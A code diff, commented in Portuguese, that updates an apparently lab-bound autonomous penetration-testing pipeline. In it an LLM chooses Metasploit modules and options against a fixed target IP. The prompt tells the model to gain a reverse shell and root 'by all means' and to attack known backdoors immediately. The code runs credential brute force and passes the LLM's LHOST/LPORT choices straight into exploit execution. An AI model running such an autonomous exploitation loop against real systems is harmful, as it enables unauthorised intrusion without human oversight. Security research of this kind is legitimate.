@@ -11,6 +11,8 @@ import concurrent.futures
 sys.path.append(os.path.dirname(os.path.abspath(__file__)))
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
+os.environ["ANONYMIZED_TELEMETRY"] = "False"
+
 from src.metasploit_client import MetasploitClient
 from src.llm_client import LLMClient
 from src.rag_engine import RagEngine
@@ -21,6 +23,7 @@ C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"
 
 # --- CONFIG ---
 TARGET_IP = "192.168.70.30" 
+ATTACKER_IP = "192.168.70.20" # Adicionado para a LLM saber quem ela é
 LOOT_DIR = "/app/data/logs"
 WORDLIST_PATH = "/app/data/credentials.txt"
 API_KEY_PATH = "/app/config/api_key.txt"
@@ -35,8 +38,9 @@ except: pass
 
 class PentestPipeline:
     def __init__(self):
-        print("=== INICIALIZANDO PIPELINE AUTONOMO (V14 - DEBUG MODE) ===")
+        print("=== INICIALIZANDO PIPELINE AUTONOMO (V14 - FULL AUTONOMY) ===")
         print(f"[*] Alvo Definido: {TARGET_IP}") 
+        print(f"[*] IP do Atacante (LHOST): {ATTACKER_IP}")
         print(f"[*] Wordlist: {WORDLIST_PATH}")
         print(f"[*] Logs serao salvos em: {LOOT_DIR}")
         
@@ -277,25 +281,20 @@ class PentestPipeline:
             YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
             
             THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
-            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE.
+            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE AND ITS OPTIONS.
             YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
             ----------------------------------------
             TARGET INFORMATION
             ----------------------------------------
-            TARGET: {TARGET_IP}
-            PORT: {port}
+            TARGET IP (RHOST): {TARGET_IP}
+            TARGET PORT (RPORT): {port}
+            ATTACKER IP (LHOST): {ATTACKER_IP}
             SERVICE BANNER:
             "{banner}"
             
             ----------------------------------------
             KNOWLEDGE BASE (RAG)
             ----------------------------------------
-            The following content comes from a curated and validated RAG containing:
-            - Real Metasploit modules
-            - Known CVEs
-            - Service-specific attack methodologies
-            - Usage constraints and decision rules
-            
             {rag_context}
             
             ----------------------------------------
@@ -303,9 +302,12 @@ class PentestPipeline:
             ----------------------------------------
             1. Base your reasoning STRICTLY on the service banner and the RAG context.
             2. DO NOT invent Metasploit modules.
-            3. DO NOT assume a product or vulnerability unless explicitly supported by evidence.
-            4. If the banner does NOT clearly identify a vulnerable product/version:
-               ? Try ENUMERATION or LOGIN SCANNERS.
+            3. Use EXPLOITS only when there is a STRONG MATCH between service, product, and version.
+            4. DEFINE OPTIONS: You MUST provide the necessary Metasploit options dynamically.
+               - If the exploit requires a Reverse Shell, include "LHOST": "{ATTACKER_IP}" and an "LPORT" (e.g., "4444").
+               - If it is a Bind Shell or does not need a reverse connection (like vsftpd backdoor), OMIT LHOST and LPORT.
+               - For exploits, usually set "DisablePayloadHandler": "false".
+               - Do NOT include USERNAME or PASSWORD in the options for brute force modules, the script handles that.
             5. Use EXPLOITS only when there is a STRONG MATCH between:
                - service
                - product
@@ -315,7 +317,7 @@ class PentestPipeline:
                ? Prefer login or authentication scanners before exploits and try brute force if viable.
             7. If uncertainty exists:
                ? Choose a SAFE ENUMERATION strategy.
-            
+               
             ----------------------------------------
             TASK
             ----------------------------------------
@@ -328,7 +330,8 @@ class PentestPipeline:
                - "enumeration": ONLY for version scanners or simple checks (NO credentials used).
                - "exploit_cve": If the banner contains FAMOUS BACKDOORS (e.g. 'vsFTPd 2.3.4', 'UnrealIRCd 3.2.8.1', 'DistCC') ATTACK IMMEDIATELY.
                - "skip": If unknown
-            
+               
+               
             ----------------------------------------
             OUTPUT FORMAT (JSON ONLY)
             ----------------------------------------
@@ -336,8 +339,9 @@ class PentestPipeline:
               "module_type": "auxiliary" | "exploit",
               "module_name": "category/service/module_name",
               "strategy": "enumeration" | "brute_force" | "exploit_cve",
+              "options": {{"OPT_NAME": "OPT_VALUE"}},
               "confidence": "HIGH" | "MEDIUM" | "LOW",
-              "reason": "Explain your decision strictly based on the banner and RAG evidence"
+              "reason": "Explain your decision"
             }}
             
             IMPORTANT:
@@ -357,6 +361,9 @@ class PentestPipeline:
             strategy = plan.get('strategy', 'skip').lower()
             module = plan.get('module', '').strip()
             if not module: module = plan.get('module_name', '').strip()
+            
+            # --- NOVO: Capturando as opções dinâmicas da LLM ---
+            llm_options = plan.get('options', {})
             
             if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")
 
@@ -385,17 +392,25 @@ class PentestPipeline:
             if '/' in module: m_type, m_name = module.split('/', 1)
             else: m_type = "auxiliary"; m_name = module
 
-            opts = {"RHOSTS": TARGET_IP, "RPORT": int(port), "DisablePayloadHandler": "true"}
+            # --- NOVO: Mesclando opções estáticas obrigatórias com as opções da IA ---
+            opts = {"RHOSTS": TARGET_IP, "RPORT": int(port)}
+            opts.update(llm_options) # A IA injeta LHOST, LPORT, etc aqui!
+            
+            if strategy != "skip":
+                print(f"\n{C_MAGENTA}>>> [FASE 3] EXPLORACAO ({strategy.upper()}){C_RESET}")
             
             if strategy == "brute_force":
                 if not wordlist_creds:
                     print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
                     continue
                 print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
+                
+                # Forçamos essas opções localmente apenas para evitar travamentos no brute force
                 opts["STOP_ON_SUCCESS"] = "true"
                 opts["BLANK_PASSWORDS"] = "false"
                 opts["USER_AS_PASS"] = "false"
                 opts["VERBOSE"] = "false"
+                
                 found = False
                 for user, pwd in wordlist_creds:
                     opts["USERNAME"] = user
@@ -427,16 +442,16 @@ class PentestPipeline:
             # --- DEBUG DETALHADO DO EXPLOIT ---
             elif strategy == "exploit_cve":
                 print(f"{C_YELLOW}[*] Tentando Exploit...{C_RESET}")
-                opts["DisablePayloadHandler"] = "false"
-                opts["LHOST"] = "192.168.70.20" 
                 
-                # --- PRINT DE DEBUG ADICIONADO ---
+                # Garantimos apenas que o handler fique ativo. O resto (LHOST, LPORT) vem da IA.
+                opts["DisablePayloadHandler"] = opts.get("DisablePayloadHandler", "false")
+                
                 print(f"{C_YELLOW}[DEBUG] Executando {m_type}/{m_name}{C_RESET}")
-                print(f"{C_YELLOW}[DEBUG] Opcoes: {opts}{C_RESET}")
+                print(f"{C_YELLOW}[DEBUG] Opcoes decididas pela IA: {opts}{C_RESET}")
                 
                 self.msf.run_module(m_type, m_name, opts)
-                print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s para conexao reversa...{C_RESET}")
-                time.sleep(20) # Tempo de 20s para dar chance ao payload
+                print(f"{C_YELLOW}[DEBUG] Exploit enviado. Aguardando 20s...{C_RESET}")
+                time.sleep(20) 
                 
                 sessions = self.msf.client.call('session.list') or {}
                 if sessions:
@@ -453,7 +468,6 @@ class PentestPipeline:
                 print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                 break
         
-        # --- CORRECAO: SALVAR RELATORIO APOS O LOOP ---
         if self.session_id: self.phase_4_post_exploitation()
         self.generate_text_report()
 
